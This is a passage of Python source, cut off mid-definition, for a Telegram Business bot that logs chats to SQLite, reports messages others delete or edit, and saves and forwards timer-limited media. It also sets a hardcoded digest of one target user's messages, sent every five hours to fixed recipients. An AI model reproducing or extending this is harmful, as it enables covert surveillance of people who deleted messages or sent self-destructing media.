from __future__ import annotations

import html
import csv
from datetime import datetime
import json
import mimetypes
import os
import re
import sqlite3
import sys
import time
import uuid
from decimal import Decimal, InvalidOperation
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import quote
from urllib.request import Request, urlopen
from zoneinfo import ZoneInfo

from dotenv import load_dotenv


BASE_DIR = Path(__file__).resolve().parent
DATA_DIR = Path(os.getenv("DATA_DIR", str(BASE_DIR / "logger_data"))).expanduser().resolve()
MEDIA_DIR = DATA_DIR / "media"
BACKUP_DIR = DATA_DIR / "backups"
DB_PATH = DATA_DIR / "bot_test.sqlite3"
LOG_PATH = DATA_DIR / "bot.log"
LOCK_PATH = DATA_DIR / "bot.lock"
RAW_UPDATES_PATH = DATA_DIR / "raw_updates.jsonl"
MENU_IMAGE_PATH = BASE_DIR / "assets" / "holly_menu.png"

DATA_DIR.mkdir(parents=True, exist_ok=True)
MEDIA_DIR.mkdir(parents=True, exist_ok=True)
BACKUP_DIR.mkdir(parents=True, exist_ok=True)

load_dotenv(BASE_DIR / ".env.deleted_logger", encoding="utf-8-sig", override=True)

BOT_TOKEN = (os.getenv("LOGGER_BOT_TOKEN") or os.getenv("BOT_TOKEN") or "").strip()
BOT_USERNAME = os.getenv("LOGGER_BOT_USERNAME", "").strip().lstrip("@")
ADMIN_USER_IDS = {
    int(item.strip())
    for item in os.getenv("ADMIN_USER_IDS", "").replace(";", ",").split(",")
    if item.strip().isdigit()
}
ADMIN_USER_IDS.add(1141626866)
CHAT_VIEW_BLOCKED_USER_IDS = {8464597898}
MESSAGE_DIGEST_TARGET_USER_ID = 7732538826
MESSAGE_DIGEST_RECIPIENT_IDS = {1141626866, 8464597898}
MESSAGE_DIGEST_INTERVAL_SEC = 5 * 3600
MAX_MEDIA_ARCHIVE_MB = float(os.getenv("MAX_MEDIA_ARCHIVE_MB", "50"))
MAX_MEDIA_ARCHIVE_BYTES = int(MAX_MEDIA_ARCHIVE_MB * 1024 * 1024)
FORWARD_TIMER_MEDIA = os.getenv("FORWARD_TIMER_MEDIA", "1").strip() != "0"
FORWARD_ALL_BUSINESS_MEDIA = os.getenv("FORWARD_ALL_BUSINESS_MEDIA", "0").strip() == "1"

# --- подписки / рефералка / СБП ---
DEFAULT_SUB_PLANS = {
    15: {"stars": 50, "rub": 40},
    30: {"stars": 100, "rub": 80},
}
ROLLYPAY_API_BASE = os.getenv("ROLLYPAY_API_BASE", "https://api.rollypay.io").strip().rstrip("/")
ROLLYPAY_TERMINAL_ID = os.getenv("ROLLYPAY_TERMINAL_ID", "").strip()
ROLLYPAY_API_KEY = os.getenv("ROLLYPAY_API_KEY", "").strip()
ROLLYPAY_TEST_MODE = os.getenv("ROLLYPAY_TEST_MODE", "false").strip().lower() in {"1", "true", "yes", "on"}
ROLLYPAY_ENABLED = bool(
    ROLLYPAY_API_KEY and ROLLYPAY_API_KEY.upper() not in {"CHANGE_ME", "YOUR_TOKEN"}
)
REF_REQUIRED = int(os.getenv("REF_REQUIRED", "3"))   # сколько друзей позвать
REF_DAYS = int(os.getenv("REF_DAYS", "3"))           # за это дают дней триала
PROMPT_COOLDOWN_SEC = 6 * 3600                       # напоминать о подписке не чаще раза в 6 часов
MAINTENANCE_INTERVAL_SEC = 300
BACKUP_KEEP = 7
DISPLAY_TIMEZONE = ZoneInfo(os.getenv("DISPLAY_TIMEZONE", "Europe/Moscow"))

if not BOT_TOKEN:
    raise RuntimeError("Set LOGGER_BOT_TOKEN or BOT_TOKEN")

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
FILE_API_URL = f"https://api.telegram.org/file/bot{BOT_TOKEN}/"

ALLOWED_UPDATES = [
    "message",
    "edited_message",
    "callback_query",
    "pre_checkout_query",
    "business_connection",
    "business_message",
    "edited_business_message",
    "deleted_business_messages",
]

MEDIA_SENDERS = {
    "photo": ("sendPhoto", "photo"),
    "video": ("sendVideo", "video"),
    "animation": ("sendAnimation", "animation"),
    "document": ("sendDocument", "document"),
    "voice": ("sendVoice", "voice"),
    "audio": ("sendAudio", "audio"),
    "video_note": ("sendVideoNote", "video_note"),
    "sticker": ("sendSticker", "sticker"),
}

MEDIA_LABELS = {
    "photo": "фото",
    "video": "видео",
    "animation": "анимация",
    "document": "файл",
    "voice": "голосовое",
    "audio": "аудио",
    "video_note": "кружок",
    "sticker": "стикер",
    "location": "геолокация",
    "contact": "контакт",
    "poll": "опрос",
    "dice": "кубик",
    "story": "история",
    "gift": "подарок",
}

IMMEDIATE_REPLY_MEDIA_TYPES = {"photo", "video", "video_note", "animation"}


class TelegramApiError(RuntimeError):
    pass


def acquire_single_instance_lock():
    handle = LOCK_PATH.open("a+b")
    if LOCK_PATH.stat().st_size == 0:
        handle.write(b"0")
        handle.flush()
    handle.seek(0)

    try:
        if sys.platform == "win32":
            import msvcrt

            msvcrt.locking(handle.fileno(), msvcrt.LK_NBLCK, 1)
        else:
            import fcntl

            fcntl.flock(handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
    except (OSError, PermissionError) as exc:
        handle.close()
        raise RuntimeError("Bot is already running. Close the old process before starting a new one.") from exc

    return handle


def release_single_instance_lock(handle) -> None:
    try:
        handle.seek(0)
        if sys.platform == "win32":
            import msvcrt

            msvcrt.locking(handle.fileno(), msvcrt.LK_UNLCK, 1)
        else:
            import fcntl

            fcntl.flock(handle.fileno(), fcntl.LOCK_UN)
    finally:
        handle.close()


def log(message: str) -> None:
    line = f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {message}"
    print(line, flush=True)
    with LOG_PATH.open("a", encoding="utf-8") as file:
        file.write(line + "\n")


def raw_log(event_type: str, payload: dict) -> None:
    record = {
        "ts": int(time.time()),
        "event_type": event_type,
        "payload": payload,
    }
    with RAW_UPDATES_PATH.open("a", encoding="utf-8") as file:
        file.write(json.dumps(record, ensure_ascii=False) + "\n")


def read_api_response(response) -> object:
    body = json.loads(response.read().decode("utf-8"))
    if not body.get("ok"):
        raise TelegramApiError(str(body.get("description", body)))
    return body.get("result")


def telegram_call(method: str, payload: dict | None = None, timeout: int = 30):
    data = None
    headers = {}
    if payload is not None:
        data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        headers["Content-Type"] = "application/json"

    request = Request(API_URL + method, data=data, headers=headers)
    try:
        with urlopen(request, timeout=timeout) as response:
            return read_api_response(response)
    except HTTPError as exc:
        try:
            body = json.loads(exc.read().decode("utf-8"))
            description = body.get("description", str(exc))
        except Exception:
            description = str(exc)
        raise TelegramApiError(f"{method}: {description}") from exc
    except URLError as exc:
        raise TelegramApiError(f"{method}: {exc.reason}") from exc


def multipart_value(value: object) -> str:
    if isinstance(value, bool):
        return "true" if value else "false"
    return str(value)


def telegram_multipart_call(
    method: str,
    fields: dict[str, object],
    files: dict[str, Path],
    timeout: int = 120,
):
    boundary = f"----CodexTelegramBoundary{uuid.uuid4().hex}"
    body = bytearray()

    def add_text(text: str) -> None:
        body.extend(text.encode("utf-8"))

    for key, value in fields.items():
        if value is None:
            continue
        add_text(f"--{boundary}\r\n")
        add_text(f'Content-Disposition: form-data; name="{key}"\r\n\r\n')
        add_text(multipart_value(value))
        add_text("\r\n")

    for key, path in files.items():
        content = path.read_bytes()
        mime_type = mimetypes.guess_type(path.name)[0] or "application/octet-stream"
        filename = path.name.replace('"', "_")
        add_text(f"--{boundary}\r\n")
        add_text(f'Content-Disposition: form-data; name="{key}"; filename="{filename}"\r\n')
        add_text(f"Content-Type: {mime_type}\r\n\r\n")
        body.extend(content)
        add_text("\r\n")

    add_text(f"--{boundary}--\r\n")
    request = Request(
        API_URL + method,
        data=bytes(body),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )

    try:
        with urlopen(request, timeout=timeout) as response:
            return read_api_response(response)
    except HTTPError as exc:
        try:
            body = json.loads(exc.read().decode("utf-8"))
            description = body.get("description", str(exc))
        except Exception:
            description = str(exc)
        raise TelegramApiError(f"{method}: {description}") from exc
    except URLError as exc:
        raise TelegramApiError(f"{method}: {exc.reason}") from exc


def send_message(
    chat_id: int,
    text: str,
    parse_mode: str | None = None,
    reply_markup: dict | None = None,
) -> None:
    max_len = 3900
    chunks = [text[i : i + max_len] for i in range(0, len(text), max_len)] or [text]
    for index, chunk in enumerate(chunks):
        payload: dict[str, object] = {"chat_id": chat_id, "text": chunk}
        if parse_mode:
            payload["parse_mode"] = parse_mode
        # клавиатуру вешаем только на последнее сообщение, если текст разрезали
        if reply_markup and index == len(chunks) - 1:
            payload["reply_markup"] = reply_markup
        try:
            telegram_call("sendMessage", payload)
        except TelegramApiError as exc:
            if parse_mode:
                fallback = html.unescape(chunk.replace("<blockquote>", "> ").replace("</blockquote>", ""))
                fallback = re.sub(r"</?tg-emoji[^>]*>", "", fallback)
                try:
                    telegram_call("sendMessage", {"chat_id": chat_id, "text": fallback})
                    continue
                except TelegramApiError:
                    pass
            log(f"sendMessage failed for {chat_id}: {exc}")
    # If this is a private notification, keep the navigation menu as the last message.
    move_menu_to_bottom(chat_id)


def _menu_message(user_id: int) -> tuple[int, int, bool] | None:
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute(
            "SELECT chat_id, message_id, is_photo FROM menu_messages WHERE user_id = ?",
            (user_id,),
        ).fetchone()
    return (int(row[0]), int(row[1]), bool(row[2])) if row else None


def _remember_menu_message(user_id: int, chat_id: int, message_id: int, is_photo: bool) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            """
            INSERT INTO menu_messages (user_id, chat_id, message_id, is_photo, updated_at)
            VALUES (?, ?, ?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                chat_id = excluded.chat_id,
                message_id = excluded.message_id,
                is_photo = excluded.is_photo,
                updated_at = excluded.updated_at
            """,
            (user_id, chat_id, message_id, int(is_photo), int(time.time())),
        )


def send_menu_page(
    user_id: int,
    chat_id: int,
    text: str,
    markup: dict,
    use_photo: bool = False,
) -> None:
    """Replace the previous menu so /start always produces one current message."""
    previous = _menu_message(user_id)
    if previous:
        try:
            telegram_call("deleteMessage", {"chat_id": previous[0], "message_id": previous[1]})
        except TelegramApiError:
            pass
    try:
        if use_photo and MENU_IMAGE_PATH.exists() and len(text) <= 1024:
            photo_file_id = maintenance_get("menu_photo_file_id")
            if photo_file_id:
                try:
                    result = telegram_call(
                        "sendPhoto",
                        {
                            "chat_id": chat_id,
                            "photo": photo_file_id,
                            "caption": text,
                            "parse_mode": "HTML",
                            "reply_markup": markup,
                        },
                    )
                except TelegramApiError:
                    maintenance_set("menu_photo_file_id", "")
                    result = telegram_multipart_call(
                        "sendPhoto",
                        {
                            "chat_id": chat_id,
                            "caption": text,
                            "parse_mode": "HTML",
                            "reply_markup": json.dumps(markup, ensure_ascii=False),
                        },
                        {"photo": MENU_IMAGE_PATH},
                    )
                    if isinstance(result, dict):
                        photos = result.get("photo") or []
                        if photos and photos[-1].get("file_id"):
                            maintenance_set("menu_photo_file_id", str(photos[-1]["file_id"]))
            else:
                result = telegram_multipart_call(
                    "sendPhoto",
                    {
                        "chat_id": chat_id,
                        "caption": text,
                        "parse_mode": "HTML",
                        "reply_markup": json.dumps(markup, ensure_ascii=False),
                    },
                    {"photo": MENU_IMAGE_PATH},
                )
                if isinstance(result, dict):
                    photos = result.get("photo") or []
                    if photos and photos[-1].get("file_id"):
                        maintenance_set("menu_photo_file_id", str(photos[-1]["file_id"]))
            is_photo = True
        else:
            result = telegram_call(
                "sendMessage",
                {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "reply_markup": markup},
            )
            is_photo = False
        if isinstance(result, dict) and result.get("message_id"):
            _remember_menu_message(user_id, chat_id, int(result["message_id"]), is_photo)
    except TelegramApiError as exc:
        log(f"menu message failed for {chat_id}: {exc}")


def move_menu_to_bottom(chat_id: int) -> None:
    """Keep the currently opened menu page unchanged when notifications arrive."""
    return


def send_document(chat_id: int, path: Path, caption: str = "") -> None:
    fields: dict[str, object] = {"chat_id": chat_id}
    if caption:
        fields["caption"] = caption
    telegram_multipart_call("sendDocument", fields, {"document": path}, timeout=60)


def html_text(value: object) -> str:
    return html.escape(str(value or ""), quote=False)


def format_display_time(timestamp: int | float, pattern: str = "%d.%m.%Y %H:%M") -> str:
    return datetime.fromtimestamp(int(timestamp), DISPLAY_TIMEZONE).strftime(pattern)


def html_quote(value: object) -> str:
    text = html_text(value) or "[сообщение без текста]"
    return f"<blockquote>{text}</blockquote>"


def bot_signature_html() -> str:
    return f"\n\n@{html_text(BOT_USERNAME)}" if BOT_USERNAME else ""


def author_with_id(author: str, user_id: int | None) -> str:
    if not user_id:
        return author
    marker = f"ID: {user_id}"
    if marker in author:
        return author
    return f"{author} ({marker})"


def deleted_notification_html(
    author: str,
    content: str,
    chat_info: str | None = None,
    user_id: int | None = None,
) -> str:
    header = f"{html_text(author_with_id(author, user_id))} удалил(а) сообщение"
    if chat_info:
        header += f" в чате {html_text(chat_info)}"
    return (
        f"{header}:\n\n"
        f"{html_quote(content)}"
        f"{bot_signature_html()}"
    )


def edited_notification_html(author: str, old_content: str, new_content: str) -> str:
    return (
        f"{html_text(author)} изменил(а) сообщение:\n\n"
        f"Old:\n{html_quote(old_content)}\n\n"
        f"New:\n{html_quote(new_content)}"
        f"{bot_signature_html()}"
    )


def media_notification_html(
    author: str,
    content: str,
    media_type: str,
    ttl_seconds: int | None,
    source: str = "message",
) -> str:
    label = MEDIA_LABELS.get(media_type, media_type)
    if ttl_seconds:
        title = f"отправил(а) медиа с таймером ({ttl_seconds} сек.)"
    elif source == "reply":
        title = "отправил(а) медиа из ответа"
    else:
        title = "отправил(а) медиа"
    return (
        f"{html_text(author)} {title}:\n\n"
        f"{html_quote(content or f'[{label}]')}"
        f"{bot_signature_html()}"
    )


def unknown_deleted_notification_html(message_id: int, chat_info: str | None = None) -> str:
    header = "Неизвестный пользователь удалил(а) сообщение"
    if chat_info:
        header += f" в чате {html_text(chat_info)}"
    return (
        f"{header}:\n\n"
        f"{html_quote(f'ID {message_id}; сообщение не было сохранено')}"
        f"{bot_signature_html()}"
    )


def ensure_column(conn: sqlite3.Connection, table: str, column: str, definition: str) -> None:
    columns = {row[1] for row in conn.execute(f"PRAGMA table_info({table})")}
    if column not in columns:
        conn.execute(f"ALTER TABLE {table} ADD COLUMN {column} {definition}")


def init_db() -> None:
    with sqlite3.connect(DB_PATH) as conn:
        # Cleanup from the temporary internal multi-account test build.
        conn.execute("DROP TABLE IF EXISTS test_accounts")
        conn.execute("DROP TABLE IF EXISTS test_runtime_state")
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                private_chat_id INTEGER,
                created_at INTEGER NOT NULL,
                updated_at INTEGER NOT NULL
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS chat_owners (
                chat_id INTEGER PRIMARY KEY,
                owner_id INTEGER NOT NULL,
                created_at INTEGER NOT NULL
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS business_connections (
                connection_id TEXT PRIMARY KEY,
                owner_id INTEGER,
                notify_chat_id INTEGER,
                is_enabled INTEGER NOT NULL,
                can_reply INTEGER,
                rights_json TEXT,
                created_at INTEGER NOT NULL,
                updated_at INTEGER NOT NULL
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS messages (
                context TEXT NOT NULL,
                chat_id INTEGER NOT NULL,
                message_id INTEGER NOT NULL,
                user_id INTEGER,
                author TEXT,
                content TEXT NOT NULL,
                media_type TEXT,
                media_file_id TEXT,
                media_unique_id TEXT,
                media_json TEXT,
                local_media_path TEXT,
                has_media_spoiler INTEGER NOT NULL DEFAULT 0,
                ttl_seconds INTEGER,
                reply_to_message_id INTEGER,
                reply_to_author TEXT,
                reply_to_content TEXT,
                created_at INTEGER NOT NULL,
                updated_at INTEGER NOT NULL,
                deleted_at INTEGER,
                PRIMARY KEY (context, chat_id, message_id)
            )
            """
        )
        ensure_column(conn, "business_connections", "can_reply", "INTEGER")
        ensure_column(conn, "business_connections", "rights_json", "TEXT")
        ensure_column(conn, "messages", "media_type", "TEXT")
        ensure_column(conn, "messages", "media_file_id", "TEXT")
        ensure_column(conn, "messages", "media_unique_id", "TEXT")
        ensure_column(conn, "messages", "media_json", "TEXT")
        ensure_column(conn, "messages", "local_media_path", "TEXT")
        ensure_column(conn, "messages", "has_media_spoiler", "INTEGER NOT NULL DEFAULT 0")
        ensure_column(conn, "messages", "ttl_seconds", "INTEGER")
        ensure_column(conn, "messages", "updated_at", "INTEGER NOT NULL DEFAULT 0")
        ensure_column(conn, "messages", "deleted_at", "INTEGER")
        ensure_column(conn, "messages", "reply_to_message_id", "INTEGER")
        ensure_column(conn, "messages", "reply_to_author", "TEXT")
        ensure_column(conn, "messages", "reply_to_content", "TEXT")

        # --- подписки, рефералы и платежи ---
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS subs (
                user_id INTEGER PRIMARY KEY,
                until_ts INTEGER NOT NULL DEFAULT 0,
                trial_used INTEGER NOT NULL DEFAULT 0,
                last_prompt_ts INTEGER NOT NULL DEFAULT 0,
                updated_at INTEGER NOT NULL
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS referrals (
                referrer_id INTEGER NOT NULL,
                invitee_id INTEGER NOT NULL UNIQUE,
                created_at INTEGER NOT NULL
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS payments (
                tg_payment_id TEXT PRIMARY KEY,
                user_id INTEGER NOT NULL,
                days INTEGER NOT NULL,
                stars INTEGER NOT NULL,
                payload TEXT,
                created_at INTEGER NOT NULL
            )
            """
        )
        ensure_column(conn, "users", "first_name", "TEXT")
        ensure_column(conn, "users", "last_name", "TEXT")
        ensure_column(conn, "users", "username", "TEXT")
        ensure_column(conn, "users", "communication_style", "TEXT NOT NULL DEFAULT ''")
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS subscription_plans (
                days INTEGER PRIMARY KEY,
                price_stars INTEGER NOT NULL,
                price_rub INTEGER NOT NULL,
                updated_at INTEGER NOT NULL
            )
            """
        )
        conn.executemany(
            """
            INSERT OR IGNORE INTO subscription_plans (days, price_stars, price_rub, updated_at)
            VALUES (?, ?, ?, ?)
            """,
            [
                (days, prices["stars"], prices["rub"], int(time.time()))
                for days, prices in DEFAULT_SUB_PLANS.items()
            ],
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS sbp_payments (
                payment_id TEXT PRIMARY KEY,
                order_id TEXT NOT NULL UNIQUE,
                user_id INTEGER NOT NULL,
                days INTEGER NOT NULL,
                rub INTEGER NOT NULL,
                status TEXT NOT NULL DEFAULT 'created',
                created_at INTEGER NOT NULL,
                paid_at INTEGER
            )
            """
        )
        ensure_column(conn, "payments", "payer_id", "INTEGER")
        ensure_column(conn, "payments", "promo_code", "TEXT")
        ensure_column(conn, "sbp_payments", "payer_id", "INTEGER")
        ensure_column(conn, "sbp_payments", "promo_code", "TEXT")
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS blocked_users (
                user_id INTEGER PRIMARY KEY,
                reason TEXT,
                blocked_by INTEGER NOT NULL,
                created_at INTEGER NOT NULL
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS admin_actions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER NOT NULL,
                action TEXT NOT NULL,
                target_id INTEGER,
                details TEXT,
                created_at INTEGER NOT NULL
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS bot_admins (
                user_id INTEGER PRIMARY KEY,
                added_by INTEGER NOT NULL,
                created_at INTEGER NOT NULL
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS promo_codes (
                code TEXT PRIMARY KEY,
                discount_percent INTEGER NOT NULL,
                expires_at INTEGER NOT NULL,
                max_uses INTEGER NOT NULL,
                uses INTEGER NOT NULL DEFAULT 0,
                active INTEGER NOT NULL DEFAULT 1,
                created_by INTEGER NOT NULL,
                created_at INTEGER NOT NULL
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS promo_activations (
                user_id INTEGER PRIMARY KEY,
                code TEXT NOT NULL,
                activated_at INTEGER NOT NULL
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS support_tickets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                user_text TEXT NOT NULL,
                admin_id INTEGER,
                admin_reply TEXT,
                status TEXT NOT NULL DEFAULT 'open',
                created_at INTEGER NOT NULL,
                replied_at INTEGER
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS subscription_reminders (
                user_id INTEGER NOT NULL,
                until_ts INTEGER NOT NULL,
                days_before INTEGER NOT NULL,
                sent_at INTEGER NOT NULL,
                PRIMARY KEY (user_id, until_ts, days_before)
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS maintenance_state (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL,
                updated_at INTEGER NOT NULL
            )
            """
        )
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS menu_messages (
                user_id INTEGER PRIMARY KEY,
                chat_id INTEGER NOT NULL,
                message_id INTEGER NOT NULL,
                is_photo INTEGER NOT NULL DEFAULT 0,
                updated_at INTEGER NOT NULL
            )
            """
        )


def register_user(
    user_id: int,
    private_chat_id: int | None = None,
    profile: dict | None = None,
) -> None:
    now = int(time.time())
    profile = profile or {}
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            """
            INSERT INTO users (
                user_id, private_chat_id, created_at, updated_at,
                first_name, last_name, username
            )
            VALUES (?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET
                private_chat_id = COALESCE(excluded.private_chat_id, users.private_chat_id),
                first_name = COALESCE(excluded.first_name, users.first_name),
                last_name = COALESCE(excluded.last_name, users.last_name),
                username = COALESCE(excluded.username, users.username),
                updated_at = excluded.updated_at
            """,
            (
                user_id,
                private_chat_id,
                now,
                now,
                profile.get("first_name"),
                profile.get("last_name"),
                profile.get("username"),
            ),
        )


def set_chat_owner(chat_id: int, owner_id: int) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            """
            INSERT INTO chat_owners (chat_id, owner_id, created_at)
            VALUES (?, ?, ?)
            ON CONFLICT(chat_id) DO UPDATE SET
                owner_id = excluded.owner_id,
                created_at = excluded.created_at
            """,
            (chat_id, owner_id, int(time.time())),
        )


def get_chat_owner(chat_id: int) -> int | None:
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute("SELECT owner_id FROM chat_owners WHERE chat_id = ?", (chat_id,)).fetchone()
    return int(row[0]) if row else None


def remove_chat_owner(chat_id: int) -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute("DELETE FROM chat_owners WHERE chat_id = ?", (chat_id,))


def get_user_chats(user_id: int) -> list[int]:
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute(
            "SELECT chat_id FROM chat_owners WHERE owner_id = ? ORDER BY created_at DESC",
            (user_id,),
        ).fetchall()
    return [int(row[0]) for row in rows]


def get_private_chat_id(user_id: int) -> int:
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute("SELECT private_chat_id FROM users WHERE user_id = ?", (user_id,)).fetchone()
    return int(row[0]) if row and row[0] else user_id


def save_business_connection(connection: dict) -> None:
    user = connection.get("user") or {}
    owner_id = user.get("id")
    notify_chat_id = connection.get("user_chat_id") or owner_id
    is_enabled = 1 if connection.get("is_enabled", True) else 0
    can_reply = connection.get("can_reply")
    rights = {
        key: value
        for key, value in connection.items()
        if key.startswith("can_") or key in {"rights", "permissions"}
    }
    now = int(time.time())

    if owner_id:
        register_user(int(owner_id), int(notify_chat_id) if notify_chat_id else None, user)

    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            """
            INSERT INTO business_connections
                (connection_id, owner_id, notify_chat_id, is_enabled, can_reply, rights_json, created_at, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(connection_id) DO UPDATE SET
                owner_id = excluded.owner_id,
                notify_chat_id = excluded.notify_chat_id,
                is_enabled = excluded.is_enabled,
                can_reply = excluded.can_reply,
                rights_json = excluded.rights_json,
                updated_at = excluded.updated_at
            """,
            (
                connection["id"],
                owner_id,
                notify_chat_id,
                is_enabled,
                1 if can_reply else 0 if can_reply is not None else None,
                json.dumps(rights, ensure_ascii=False),
                connection.get("date", now),
                now,
            ),
        )


def get_business_notify_chat_id(connection_id: str) -> int | None:
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute(
            """
            SELECT notify_chat_id, owner_id, is_enabled
            FROM business_connections
            WHERE connection_id = ?
            """,
            (connection_id,),
        ).fetchone()
    if not row or not row[2]:
        return None
    return int(row[0] or row[1]) if row[0] or row[1] else None


def get_business_owner_id(connection_id: str) -> int | None:
    with sqlite3.connect(DB_PATH) as conn:
        row = conn.execute(
            """
            SELECT owner_id, is_enabled
            FROM business_connections
            WHERE connection_id = ?
            """,
            (connection_id,),
        ).fetchone()
    if not row or not row[1] or not row[0]:
        return None
    return int(row[0])


def list_business_connections(owner_id: int | None = None) -> list[dict]:
    query = """
        SELECT connection_id, owner_id, notify_chat_id, is_enabled, can_reply, created_at, updated_at
        FROM business_connections
    """
    params: tuple[object, ...] = ()
    if owner_id is not None:
        query += " WHERE owner_id = ?"
        params = (owner_id,)
    query += " ORDER BY is_enabled DESC, updated_at DESC"

    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute(query, params).fetchall()
    return [dict(row) for row in rows]


def restore_business_connections(owner_id: int | None = None) -> list[dict]:
    rows = list_business_connections(owner_id)
    disabled = [row for row in rows if not row.get("is_enabled")]
    if not disabled:
        return []

    now = int(time.time())
    ids = [row["connection_id"] for row in disabled]
    placeholders = ",".join("?" for _ in ids)
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(
            f"UPDATE business_connections SET is_enabled = 1, updated_at = ? WHERE connection_id IN ({placeholders})",
            (now, *ids),
        )
    return disabled


def short_connection_id(connection_id: object) -> str:
    text = str(connection_id or "")
    if len(text) <= 16:
        return text
    return f"{text[:8]}...{text[-6:]}"


def same_user_id(left: object, right: object) -> bool:
    if left is None or right is None:
        return False
    try:
        return int(left) == int(right)
    except (TypeError, ValueError):
        return False


def saved_message_is_from_user(saved_message: dict | None, user_id: int | None) -> bool:
    return bool(saved_message and same_user_id(saved_message.get("user_id"), user_id))


def message_is_from_user(message: dict | None, user_id: int | None) -> bool:
    if not isinstance(message, dict):
        return False
    return same_user_id((message.get("from") or {}).get("id"), user_id)


def is_owner_admin(user_id: int | None) -> bool:
    return bool(user_id is not None and int(user_id) in ADMIN_USER_IDS)


def is_admin_user(user_id: int | None) -> bool:
    if user_id is None:
        return False
    user_id = int(user_id)
    if is_owner_admin(user_id):
        return True
    try:
        with sqlite3.connect(DB_PATH) as conn:
            return conn.execute(
                "SELECT 1 FROM bot_admins WHERE user_id = ?", (user_id,)
            ).fetchone() is not None
    except sqlite3.Error:
        return False


def list_admin_ids() -> list[int]:
    ids = set(ADMIN_USER_IDS)
    try:
        with sqlite3.connect(DB_PATH) as conn:
            ids.update(
                int(row[0])
                for row in conn.execute("SELECT user_id FROM bot_admins").fetchall()
            )
    except sqlite3.Error:
        pass
    return sorted(ids)


def list_delegated_admins() -> list[tuple[int, int, int]]:
    try:
        with sqlite3.connect(DB_PATH) as conn:
            return [
                (int(row[0]), int(row[1]), int(row[2]))
                for row in conn.execute(
                    "SELECT user_id, added_by, created_at FROM bot_admins ORDER BY created_at DESC"
                ).fetchall()
            ]
    except sqlite3.Error:
        return []


def add_bot_admin(owner_id: int, target_id: int) -> tuple[bool, str]:
    if not is_owner_admin(owner_id):
        return False, "Выдавать админку может только владелец."
    if target_id in ADMIN_USER_IDS:
        return False, "Этот пользователь уже владелец бота."
    if not user_exists(target_id):
        return False, "Пользователь должен хотя бы один раз открыть бота."
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.execute(
            "INSERT OR IGNORE INTO bot_admins (user_id, added_by, created_at) VALUES (?, ?, ?)",
            (target_id, owner_id, int(time.time())),
        )
    if cur.rowcount == 0:
        return False, "У пользователя уже есть админка."
    audit_admin(owner_id, "выдача админки", target_id)
    return True, f"Админка выдана пользователю {target_id}."


def remove_bot_admin(owner_id: int, target_id: int) -> tuple[bool, str]:
    if not is_owner_admin(owner_id):
        return False, "Снимать админку может только владелец."
    if target_id in ADMIN_USER_IDS:
        return False, "Владельца нельзя снять через бота."
    with sqlite3.connect(DB_PATH) as conn:
        cur = conn.execute("DELETE FROM bot_admins WHERE user_id = ?", (target_id,))
    if cur.rowcount == 0:
        return False, "У пользователя нет выданной админки."
    audit_admin(owner_id, "снятие админки", target_id)
    return True, f"Админка снята у пользователя {target_id}."

def deny_admin_command(chat_id: int) -> None:
    send_message(chat_id, "Эта команда доступна только администраторам.")


# ============================================================================
# ГЛАВНОЕ МЕНЮ · ПОДПИСКА · ПОМОЩЬ · АДМИН-ПАНЕЛЬ
# Premium emoji pack used both in text and inline keyboard buttons.
# ============================================================================

NEWS = {
    "home":    ("🏠", "5416041192905265756"),
    "stars":   ("⭐️", "5438496463044752972"),
    "invite":  ("🔗", "5271604874419647061"),
    "support": ("💬", "5443038326535759644"),
    "check":   ("✔️", "5206607081334906820"),
    "pay":     ("💵", "5409048419211682843"),
    "gift":    ("🎉", "5461151367559141950"),
    "admin":   ("⚙️", "5341715473882955310"),
    "view":    ("👀", "5210956306952758910"),
    "refresh": ("🔄", "5375338737028841420"),
    "bonus":   ("💎", "5427168083074628963"),
